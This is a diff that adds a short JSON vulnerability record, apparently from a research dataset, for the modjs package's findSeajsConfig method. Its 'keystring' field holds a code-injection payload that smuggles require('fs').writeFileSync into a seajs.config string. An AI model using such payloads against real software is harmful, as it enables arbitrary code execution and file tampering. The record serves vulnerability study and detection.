@@ -1,0 +1,8 @@
+{
+  "id": "",
+  "upstream": "modjs@0.1.12",
+  "keymethod": "findSeajsConfig",
+  "keystring": "seajs.config({a: require('fs').writeFileSync('./modjs', '')})",
+  "location": "lib/utils/sea.js:284:22",
+  "downstreams": []
+}
